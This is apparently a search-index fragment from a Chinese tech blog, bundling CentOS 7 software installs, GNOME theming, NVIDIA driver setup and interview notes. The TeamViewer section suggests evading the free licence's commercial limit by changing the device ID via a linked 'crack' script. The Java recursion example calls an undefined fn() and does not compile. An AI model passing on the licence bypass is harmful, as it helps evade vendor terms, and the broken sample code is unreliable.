musicCategories=AudioVideo;Player;RecorderKeywords=musicExec=/snap/bin/netease-musicIcon=/var/lib/snapd/snap/netease-music/current/snap/gui/icon.pngTerminal=falseStartupNotify=true# 导航到：应用程序 --&gt; 影音 --&gt; Netease-music，直接点击快捷方式启动应用，效果图如下# 或者直接执行命令（使用普通用户权限）$ /snap/bin/netease-music 百度网盘 2019 年 6 月份，百度网盘宣布支持 Linux 平台，官网显示适配中标麒麟桌面操作系统（兆芯版）V7.0 与 Ubuntu V18.04；目前提供 rpm 和 deb 包下载，官方下载地址可以点这里。 123456789101112# 下载# http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/2.0.2/baidunetdisk_linux_2.0.2.rpm# 安装# rpm -ivh baidunetdisk_linux_2.0.2.rpm# 导航到：应用程序 --&gt; 互联网 --&gt; baidunetdisk，直接点击快捷方式启动应用，效果图如下# 提示：# 默认安装位置：/opt/baidunetdisk# 用户配置文件位置：~/baidunetdisk# 默认下载位置：~/baidunetdiskdownload TeamViewer TeamViewer：功能齐全的完整版本，拥有该系列软件的全部功能，既可以当作服务器端供其他人进行连接，也可以当作控制端连接其它作为终端的服务器端。 TeamViewer Host：一个去除了控制端功能的简化版本，它的用途就是将电脑设置为一个可供其他人随时进行连接的服务器端系统，支持在不限数量的计算机和设备上安装。 提示：上述两个版本不支持同时安装，其中两者的安装都需要依赖 EPEL 源，如果仅需要提供 Centos 宿主机给其他人远程访问，推荐只安装 TeamViewer Host，官方下载地址，官方中文安装教程。 12345678910111213141516171819# 导入公钥避免签名验证失败（非必需步骤）# wget https://dl.teamviewer.cn/download/linux/signature/TeamViewer2017.asc# rpm --import TeamViewer2017.asc# 下载TeamViewer（RPM包区分32位与64位系统）# wget https://dl.teamviewer.cn/download/linux/version_14x/teamviewer_14.6.2452.x86_64.rpm# 安装TeamViewer# yum install ./teamviewer_14.6.2452.x86_64.rpm# 查看TeamViewer服务的管理命令# teamviewer help# 导航到：应用程序 --&gt; 互联网 --&gt; TeamViewer 14，直接点击快捷方式启动应用，应用启动后的效果图如下# 如果需要卸载TeamViewer，可执行以下命令# yum remove teamviewer# 默认安装位置：/opt/teamviewer 12345671. TeamViewer Linux版的许可证类型默认为免费，当远程操作超过一定次数或时间，软件便会提示当前行为商业用途或者试用版到期，最后会被限制连接使用2. 突破TeamViewer的商业限制，可以尝试更改TeamViewer的ID（通常根据MAC地址生成ID），可参考以下方法更改TeamViewer的IDhttps://github.com/lyz8jj0/mac-teamviewer-crack/blob/master/TeamViewer-id-changer.py%20https://askubuntu.com/questions/423314/how-to-change-teamviewer-id-after-cloning3. 或者使用frp + mstsc(windows) + vnc(unix/linux)方案替代TeamViewer Rhythmbox 音乐播放器 rhythmbox wiKi rhythmbox github rhythmbox third party plugins 1234567891011121314# 安装播放器# yum install rhythmbox# 安装播放器插件# yum install gstreamer-ffmpeg# yum install gstreamer-plugins-bad# yum install gstreamer-plugins-ugly# 恢复播放器默认设置$ rm -rf ~/.cache/rhythmbox$ rm -rf ~/.gconf/apps/rhythmbox$ rm -rf ~/.local/share/rhythmbox# 在Gnome-Shell中，Rhythmbox应用程序的配置菜单位于活动菜单选项旁边的顶栏，应用启动后的效果图如下 参考博客 海量的超赞 Linux 软件 哪个 Linux 发行版的软件资源最多？ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"GitHub 排行榜与收集整理",url:"/posts/89d0a2f4.html",text:'GitHub排行榜 项目名称 项目地址 说明 Chrome 插件英雄榜 https://github.com/zhaoolee/ChromeAppHeroes GitHub 中文项目排行榜 https://github.com/GrowingGit/GitHub-Chinese-Top-Charts 开源组织 公司 官网 说明 阿里巴巴 https://github.com/alibaba 京东零售 https://gitee.com/jd-platform-opensource Dromara 开源社区 https://dromara.org/zh/projects/ 收集整理 项目名称 项目地址 说明 分享 GitHub 上有趣、入门级的开源项目 https://github.com/521xueweihan/HelloGitHub 收集整理 GitHub 上高质量、有趣的开源项目 https://github.com/Wechat-ggGitHub/Awesome-GitHub-Repo table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开源项目"},{title:"Linux 安装 RedisDesktopManager",url:"/posts/1302ed9d.html",text:'相关站点 RedisDesktopManager Github 项目 RedisDesktopManager 官方安装教程 RedisDesktopManager Github Releases RDM 介绍Redis Desktop Manager 是一款能够跨平台使用的开源 Redis 可视化工具，主要针对 Redis 开发设计。拥有直观强大的可视化界面，具备完善全面的数据操作功能。可以针对目标 key 执行 rename、delete、addrow、reload value 等操作，支持通过 SSH Tunnel 连接，用户可以通过它对 Redis 进行操作管理，简化原有的命令语言，充分发挥 Redis 的特性。类似的 Redis 可视化工具，还有 Fastoredis（区分免费版与专业版）。 RDM 安装Snap 安装 RDM建议直接使用 Snap 安装 Redis Desktop Manager，避免繁杂的编译安装过程，也方便以后管理软件的更新；此安装方式适用于 CentOS、Debian、Ubuntu 等 Linux 发行版，Snap 的安装和使用可参考本站教程。 1234567891011121314151617181920212223# 安装# snap install redis-desktop-manager# 查看安装状态# snap list# 创建菜单栏的快捷方式# vim /usr/share/applications/redis-desktop-manager.desktop[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=/snap/bin/redis-desktop-manager.rdm %UTerminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# 使用命令来启动（使用普通用户权限）$ /snap/bin/redis-desktop-manager.rdm# 或者菜单栏导航到：应用程序 --&gt; 编程 --&gt; Redis Desktop Manager，直接点击快捷方式来启动应用 Flatpak 安装 RDM除了上面介绍的可以通过 Snap 安装 RDM 之外，还可以通过 Flatpak 来安装，其优势和 Snap 一样。此安装方式适用于 CentOS、Debian、Ubuntu 等 Linux 发行版，Flatpak 的安装和使用可参考本站教程。 12345678910# 安装# flatpak install flathub dev.rdm.RDM# 查看安装状态# flatpak list# 使用命令来启动（使用普通用户权限）$ flatpak run dev.rdm.RDM# 或者菜单栏导航到：应用程序 --&gt; 编程 --&gt; RDM，直接点击快捷方式来启动应用 RDM 主界面图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 开发工具"},{title:"Centos7 安装壁纸应用",url:"/posts/5ffc3398.html",text:'前言 本文主要介绍两款适用于 Centos7 的桌面壁纸应用，分别是 Komorebi 和 Wonderwall，其中 Komoreb 支持使用视频、网页作为桌面动态壁纸。 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Komorebi 站点 Komorebi Github Komorebi Releases Komorebi Centos Github Komorebi Centos Releases Ubuntu 安装动态壁纸应用 Komorebi Komorebi 介绍 Komorebi 是一款 Linux 动态壁纸应用，可以实现类似 Stream Wallpaper Engine 的效果，支持使用图片、视频、网页作为桌面壁纸。Komorebi 官方默认只支持 Debian/Ubuntu 系的 Linux 发行版，如果需要在 Centos7 上安装，则需要编译分支 Komorebi-Centos 的代码，手动安装编译构建生成的 RPM 包。 Komorebi 安装 12345678910111213141516171819202122232425262728293031# 安装依赖# yum install devtoolset-6 clutter* libgee-devel webkitgtk-devel.x86_64 webkitgtk4-devel.x86_64 vala-devel cmake3 gtk3-devel# yum install https://github.com/c4pt000/komorebi-centos/releases/download/gstreamer-libav/gstreamer1-libav-1.0.6-1.el7.nux.x86_64.rpm# 切换scl版本的bash环境# scl enable devtoolset-6 bash# 进入安装目录# /usr/local# 下载源码# git clone https://github.com/c4pt000/komorebi-centos# 准备工作# cd komorebi-centos# cp -rf CMakeLists.txt CMakeLists.txt.deb# cp -rf CMakeLists.txt.rpm CMakeLists.txt# 创建构建目录# mkdir build# cd build# 编译生成rpm包# cmake3 ..# make -j16 package# 安装komorebi# rpm -ivh komorebi-2.1.0-Linux.rpm# 退出scl版本的bash环境# exit Komorebi 开机自动运行 上述安装步骤成功执行后，导航到应用程序 –&gt; 系统工具 –&gt; Komorebi，点击快捷方式运行应用后，桌面的壁纸会自动切换。此时右击桌面，可以配置 Komorebi 和选择官方的其他图片壁纸。如果需要 Komorebi 开机自启动，可以导航到应用程序 –&gt; 附件 –&gt; 优化工具 –&gt; 开机启动程序，手动添加 Komorebi 为开机自启动即可。 Komorebi 自定义壁纸 Komorebi 支持使用自定义图片和 MP4 视频作为桌面壁纸，官方提供了壁纸制作工具，导航到应用程序 –&gt; 系统工具 –&gt; Wallpaper Creator，运行应用后可以创建自定义的 Komorebi 壁纸。静态壁纸的制作比较简单，这里重点介绍动态壁纸的制作，具体可参考以下教程或者官方的动态壁纸制作教程。 1234567891011121314151617181920212223242526# 制作动态壁纸，最重要的是需要预先将视频文件转换图片文件# 安装依赖# yum install libjpeg libjpeg-devel libpng libpng-devel libtiff libtiff-devel libungif libungif-devel freetype zlib# 安装ImageMagick# yum install ImageMagick# 安装ffmpeg# yum install ffmpeg ffmpegthumbnailer# 将mp4文件转换成图片文件# ffmpeg -i redial-video.mp4 -ss 00:00:01.000 -vframes 1 thumbnail.png# 运行"Wallpaper Creator"应用来创建桌面壁纸，根据界面提示选择上面的redial-video.mp4文件与thumbnail.png文件，然后生成komorebi的壁纸资源目录，具体步骤如下图所示：# 最终生成的komorebi壁纸资源目录结构redial-video├── config├── redial-video.mp4└── wallpaper.jpg# 拷贝壁纸资源文件# cp -r redial-video /System/Resources/Komorebi/# 运行komorebi后，右击桌面打开komorebi的配置界面，先勾选"Enable Video Wallpapers"，然后选择上面创建的动态壁纸即可 Wonderwall 介绍 Wonderwall 是一款酷炫的壁纸程序，可运行在 Linux 系统的 Unity 和 GNOME 桌面环境中。Wonderwall 提供了高分辨率壁纸，非常适合市场上流行的宽屏显示器，但不支持动态壁纸功能。如果你不需要动态壁纸的功能，并抱怨 Komorebi 不能在线下载壁纸，那么 Wonderwall 非常适合你。目前没有可用的 YUM 源，但可以使用 Snap 直接安装 Wonderwall，Snap 的安装可参考本站教程。Wonderwall 拥有下列强大的功能： 支持分类下载壁纸 拥有全球最大的在线 4k 和超高清壁纸集 支持裁剪 / 缩放下载的墙纸，使其适合各种的屏幕分辨率 具有强大的壁纸搜索过滤工具，支持使用颜色，标签，类别，分辨率，受欢迎程度，观看次数，评分等搜索墙纸 Wonderwall 安装 12345678910111213141516# 安装# snap install wonderwall# 创建快捷方式# vim /usr/share/applications/wonderwall.desktop[Desktop Entry]Version=1.0GenericName=WonderwallName=WonderwallType=ApplicationIcon=/var/lib/snapd/snap/wonderwall/current/meta/gui/icon.pngKeywords=Wallpaper;Variety;wallch;desktop;backgroundExec=/snap/bin/wonderwall %FCategories=GNOME;System;Terminal=falseName[en_IN]=Wonderwall Wonderwall 运行 123456# 导航到：应用程序 --&gt; 系统工具 --&gt; Wonderwall，直接点击快捷方式启动应用，应用启动后的效果图如下# 或者直接执行命令（使用普通用户权限）$ /snap/bin/wonderwall# 提示，Wonderwall下载壁纸后的默认存放目录为：~/snap/wonderwall/current/.local/share/ktechpit/WonderWall/download GNOME Shell 的壁纸应用扩展 Google Earth Wallpaper Bing Wallpaper Changer NASA APOD Wallpaper Changer var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 桌面美化",url:"/posts/e546702a.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装依赖 12345678910111213141516# 安装epel源# yum install epel-release# 安装字体# yum install liberation-mono-fonts# 安装gnome菜单# yum install gnome-menus# 安装gnome个性化定制工具# yum install gnome-tweak-tool# 安装桌面管理器# yum install gnome-shell# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件，可以看到多了一个优化工具 Chrome 浏览器在线安装 GNOME Shell 扩展 下面的教程默认是通过手动的方式安装 GNOME Shell 扩展，但 GNOME 还支持通过浏览器安装扩展，只需要依赖浏览器附加组件和本地主机连接器。其中 Chrome 浏览器附加组件可以直接从这里在线安装，而本地主机连接器（chrome-gnome-shell）可以参考官方教程或者下面给出步骤进行安装。两者都安装完成后，可以使用 GNOME 官方的扩展网站在线安装和管理扩展了，其优点是可视化地管理扩展和方便查看扩展是否有可用的更新。 12345678910111213141516# 编译安装本地主机连接器chrome-gnome-shell# 安装依赖# yum install cmake coreutils jq# 克隆代码# git clone git://git.gnome.org/chrome-gnome-shell# 创建构建目录# mkdir build &amp;&amp; cd build# 编译# cmake -DCMAKE_INSTALL_PREFIX=/usr -DBUILD_EXTENSION=OFF ../# 安装# make install 安装 Extension Update Notifier 到目前为止，除了通过浏览器访问 GNOME 官方的扩展网站之外，无法知道更新是否可用于 GNOME Shell 扩展。幸运的是，Extension Update Notifier 可以通知你是否有可用于已安装扩展的更新，具体安装步骤如下，官方 Github 地址，官方下载地址。 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置# 创建扩展目录# mkdir ~/.local/share/gnome-shell/extensions/update-extensions@franglais125.gmail.com# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/update-extensions@franglais125.gmail.com# 查看gnome-shell的版本# gnome-shell --version# 根据gnome-shell的版本，在官网下载压缩文件# wget https://extensions.gnome.org/extension-data/update-extensions%40franglais125.gmail.com.v9.shell-extension.zip# 解压压缩文件# unzip update-extensions@franglais125.gmail.com.v9.shell-extension.zip# 删除压缩文件# rm -rf update-extensions@franglais125.gmail.com.v9.shell-extension.zip# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Extension Update Notifier"，点击"打开"即可启用扩展 安装 Netspeed Netspeed 可以在桌面顶部菜单栏显示网速，官方 Github 地址，官方下载地址。 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置# 创建扩展目录# mkdir ~/.local/share/gnome-shell/extensions/netspeed@hedayaty.gmail.com# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/netspeed@hedayaty.gmail.com# 查看gnome-shell的版本# gnome-shell --version# 根据gnome-shell的版本，在官网下载netspeed压缩文件# wget https://extensions.gnome.org/extension-data/netspeed%40hedayaty.gmail.com.v29.shell-extension.zip# 解压压缩文件# unzip netspeed@hedayaty.gmail.com.v29.shell-extension.zip# 删除压缩文件# rm -rf netspeed@hedayaty.gmail.com.v29.shell-extension.zip# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Netspeed"，点击"打开"即可启用扩展 安装 Dash-to-dock Dash-to-dock 可以很方便地将应用程序固定到右侧、左侧、顶部、底部等位置，效果类似 macOS 的底部菜单栏。官方安装教程，官方下载地址。 123456789101112131415161718192021# 以下操作，不同的Linux用户需要单独安装或者配置# 创建扩展目录# mkdir ~/.local/share/gnome-shell/extensions/dash-to-dock@micxgx.gmail.com# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/dash-to-dock@micxgx.gmail.com# 查看gnome-shell的版本# gnome-shell --version# 根据gnome-shell的版本，在官网下载dash-to-dock压缩文件# wget https://extensions.gnome.org/review/download/dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# 解压压缩文件# unzip dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# 删除压缩文件# rm -rf dash-to-dockmicxgx.gmail.com.v65.shell-extension.zip# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Dash to dock"，点击"打开"即可启用扩展 安装 DynamicTopBar DynamicTopBar 可以将的桌面顶部菜单栏变得透明，而且可以自定义透明度。官方安装教程，官方下载地址。 12345678910111213141516171819# 以下操作，不同的Linux用户需要单独安装或者配置# 进入扩展目录# cd ~/.local/share/gnome-shell/extensions/# 下载文件# wget https://github.com/AMDG2/GnomeShell_DynamicTopBar/archive/3.3.1.tar.gz# 解压压缩文件# unzip 3.3.1.tar.gz# 剪切扩展文件# mv GnomeShell_DynamicTopBar-3.3.1/dynamicTopBar@gnomeshell.feildel.fr .# 删除文件# rm -rf 3.3.1.tar.gz# rm -rf GnomeShell_DynamicTopBar-3.3.1# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 扩展，可以看到新增的"Dynamic top bar"，点击"打开"即启用扩展 其他常用的 GNOME-Shell 扩展 removable-drive-menu：显示可移除设备（如 U 盘）的拔插提示 Sound Input &amp; Output Device Chooser：选择音频输入 / 输出设备 Freon：显示 CPU 温度，CPU 电压， 显卡温度， 硬盘温度，散热风扇转速 提示：GNOME Shell 扩展的安装方法基本一致，其他扩展的安装可以参考上述步骤 删除桌面底部任务栏 12345678910# 进入gnome的全局扩展目录# cd /usr/share/gnome-shell/extensions# 备份文件# tar -cvf window-list@gnome-shell-extensions.gcampax.github.com.tar.gz window-list@gnome-shell-extensions.gcampax.github.com# 删除文件# rm -rf window-list@gnome-shell-extensions.gcampax.github.com# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，可以发现底部任务栏已经消失 系统主题介绍 GNOME 的应用主题可以从这里获取得到，建议可以选择 macOS 主题。图标主题可以从这里获取得到，建议可以选择 macOS 图标。选择主题的时候，需要留意对应的主题是否支持当前系统的 GTK 版本。其中系统主题分为以下几部分： Cursor Theme：/usr/share/icons/ Icons Themes：/usr/share/icons/ Shell Themes：/usr/share/icons/ GTK/Applications Themes：/usr/share/themes/ 基于 GTK2 安装 MacOS 主题 12345678# 查看gtk版本# pkg-config --list-all | grep gtk# 查看gtk的具体版本，如果上面显示gtk+-3.0，则将以下命令中的gtk+-2.0替换为gtk+-3.0# pkg-config --modversion gtk+-2.0# 安装gtk2依赖，如果是gtk3则不用安装# yum install gtk-murrine-engine gtk2-engines 12345678910# 下载应用主题文件，这里选择McHigh Sierra主题# wget https://xxxx/Sierra-dark.tar.xz# 解压应用主题文件# tar -xvf Sierra-dark.tar.xz# 拷贝应用主题文件# mv Sierra-dark /usr/share/themes/# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 外观，选择新增的应用主题即可 1234567891011# 下载图标主题文件# wget https://xxxx/02-McMojave-circle-black.tar.xz# 解压图标主题文件# tar -xvf 02-McMojave-circle-black.tar.xz# 拷贝图标主题文件# mv McMojave-circle-black /usr/share/icons# mv McMojave-circle-black-dark /usr/share/icons# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 外观，选择新增的图标主题即可 启用用户自定义主题 导航到应用程序 –&gt; 附件 –&gt; 优化工具 –&gt; 扩展，找到”User themes”. 点击” 打开” 即启用，否则自定义的 Shell 主题不会生效。 应用程序程序窗口居中（方法一） 因为在 CentOS7 中打开新的窗口都会靠左上角显示，所以每次打开一个窗口都要多做一步操作，将窗口移到屏幕中间。如果不想这么麻烦，可以安装 ccsm（compizconfig-settings-manager）来设置窗口位置默认为居中。 1234567# 安装ccsm# yum install ccsm# 运行ccsm（使用普通用户身份）$ ccsm# 或者导航到应用程序 --&gt; 其他 --&gt; CompizConfig设置管理器 --&gt; 窗口管理 --&gt; 放置窗口 --&gt; 常规，首先勾选"启用放置窗口"，然后设置"安置模式"为居中，如下图所示 应用程序程序窗口居中（方法二） 如果通过 ccsm 无法设置窗口位置默认为居中，那么可以尝试使用 dconf-editor 来设置。 1234567# 安装dconf-editor# yum install dconf-editor# 运行dconf-editor（使用普通用户身份）$ dconf-editor# 打开/org/gnome/mutter选项卡，找到"center-new-windows"，然后点击启用按钮即可（如下图所示），然后通过按下 Alt + F2 快捷键，然后输入 r 重启界面 参考博客 CentOS7 完全装逼指南 如何使用 GNOME Shell 扩展 CentOS7 打造合适的科研环境 How to Install GNOME Shell Extensions Using GUI &amp; Command Line Interface var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"数据结构 - 算法面试题之一",url:"/posts/a0733161.html",text:'算法递归递归的三大要素： 第一要素：明确递归函数想要干什么 第二要素：寻找递归的结束条件 第三要素：找出递归函数的等价关系式 递归的优缺点： 递归中很多计算都是重复的，由于其本质是把一个问题分解成两个或者多个小问题，多个小问题存在相互重叠的部分，则存在重复计算 调用栈可能会溢出，其实每一次函数调用会在内存栈中分配空间，而每个进程的栈的容量是有限的，当递归的层次太深时，就会超出栈的容量，从而导致栈溢出 递归由于是函数调用自身，而函数调用是有时间和空间的消耗的；每一次函数调用，都需要在内存栈中分配空间以保存参数、返回地址以及临时变量，而往栈中压入数据和弹出数据都需要时间，导致运行效率较低 递归与循环相比，循环的代码可读性不如递归，但运行效率更高 案例分析： 一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级，求该青蛙跳上一个 N 级的台阶总共有多少种跳法？ 每次跳的时候，小青蛙可以跳一个台阶，也可以跳两个台阶，也就是说，每次跳的时候，小青蛙有两种跳法 第一种跳法：第一次跳了一个台阶，那么还剩下 n-1 个台阶还没跳，剩下的 n-1 个台阶的跳法有 f (n-1) 种 第二种跳法：第一次跳了两个台阶，那么还剩下 n-2 个 台阶还没跳，剩下的 n-2 个台阶的跳法有 f (n-2) 种 所以，小青蛙的全部跳法就是这两种跳法之和，即 f (n) = f (n-1) + f (n-2) 123456789101112131415public class Example { public static void main(String[] args) { int count = f(3); System.out.println(count); } public static int f(int n) { if (n &lt;= 2) { return n; } return fn(n - 1) + fn(n - 2); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Linux 运维面试题之一",url:"/posts/fe7d7b9d.html",text:'LinuxCentos 6、7 的服务类相关命令 Centos 6 注册在系统中的标准化程序 统一的管理方式（常用方法） service 服务名 start service 服务名 stop service 服务名 restart service 服务名 status 查看服务的方法： /etc/init.d/服务名 通过 chkconfig 命令管理服务自启动 查看自启动的服务： chkconfig --list|grep xxx 启用服务自启动： chkconfig --level 5 服务名 on 关闭服务自启动： chkconfig --level 5 服务名 off Centos 7 注册在系统中的标准化程序 统一的管理方式（常用方法） systemctl start 服务名（xxx.service） systemctl stop 服务名（xxx.service） systemctl restart 服务名（xxx.service） systemctl reload 服务名（xxx.service） systemctl status 服务名（xxx.service） 查看服务的方法： /usr/lib/systemd/system/服务名 查看服务的命令 systemctl list-unit-files | grep service_name systemctl --type service | grep service_name 通过 systemctl 命令管理服务自启动 启用服务自启动： systemctl enable service_name 关闭服务自启动： systemctl disable service_name var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Centos7 安装 Nvidia 显卡驱动",url:"/posts/3a164cac.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 检查显卡的识别状况 在执行下述所有步骤之前，必须确保当前系统已经正确识别到 NVIDIA 的显卡，否则在显卡没有被正常识别的情况下，执行后续的安装步骤都是徒劳的。此时可以执行以下命令，若可以输出相关信息，则说明显卡能被系统正常识别。否则请重新插拔显卡，或者检查主板是否需要跳线或者设置 BIOS 才能正确识别独立显卡。 1# lspci | grep "NVIDIA" 安装软件依赖 1# yum -y install gcc gcc-c++ wget 安装 NVIDIA 显卡检测工具 12345678910111213# 导入key# rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org# 安装elrepo源# rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm# 安装检测工具# yum install nvidia-detect# 检测显卡，正常情况下会输出最新且适用当前显卡的驱动程序的版本号信息# nvidia-detect -v# 提示：不建议使用rpmfusion安装Nvidia的显卡驱动，因为开源的显卡驱动在性能方面跟Nvidia官方的闭源显卡驱动有一定的差距 下载 NVIDIA 驱动程序 根据显卡检测结果，在 NVIDIA 官网下载对应版本的 Linux 显卡驱动程序。 12# 下载驱动（请自行修改URL中的驱动版本号）# wget https://us.download.nvidia.cn/XFree86/Linux-x86_64/430.40/NVIDIA-Linux-x86_64-430.40.run 屏蔽系统自带的 Nouveau 显卡驱动 123456# 通过vim编辑器更改配置文件，按照以下内容进行修改# vim /lib/modprobe.d/dist-blacklist.confblacklist nouveau #添加此行options nouveau modeset=0 #添加此行# blacklist nvidiafb #将nvidiafb的这一行注释掉 重建 initramfs image 12345# 备份# mv /boot/initramfs-$(uname -r).img /boot/initramfs-$(uname -r).img.bak# 重建# dracut /boot/initramfs-$(uname -r).img $(uname -r) 重启系统 12345678910# 修改系统运行级别为纯文本模式# systemctl set-default multi-user.target# 重启系统# reboot# 系统重启完成后，在纯文本模式下使用root用户登录进系统# 查看nouveau显卡驱动是否已经被禁用，若此命令执行完之后没有输出相关信息，则说明已经被禁用# lsmod | grep nouveau 安装 NVIDIA 显卡驱动（纯文本模式下） 12345678910111213141516171819# 文件授权# chmod +x NVIDIA-Linux-x86_64-384.59.run# 安装显卡驱动# ./NVIDIA-Linux-x86_64-384.59.run# 安装过程中，选择accept；如果提示是否编译DKMS模块，选择yes（方便以后升级系统内核）；如果提示要修改xorg.conf，选择yes；# 查看显卡驱动的安装状态，若此命令执行完之后正常输出显卡状态相关的信息，则说明Nvidia显卡驱动安装成功# nvidia-smi# 修改系统运行级别为图形模式# 